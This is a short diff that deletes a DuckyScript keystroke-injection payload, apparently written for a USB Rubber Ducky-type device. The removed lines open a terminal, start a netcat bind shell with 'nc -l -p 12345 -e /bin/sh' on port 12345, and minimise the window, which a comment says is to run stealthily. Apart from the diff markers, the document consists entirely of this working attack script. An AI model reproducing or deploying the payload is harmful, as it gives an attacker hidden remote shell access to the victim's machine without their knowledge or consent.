@@ -1,7 +1,0 @@
-REM Open terminal
-GUI t
-REM Start bind shell
-STRING nc -l -p 12345 -e /bin/sh
-ENTER
-REM Minimise window to run stealthily
-ALT F9
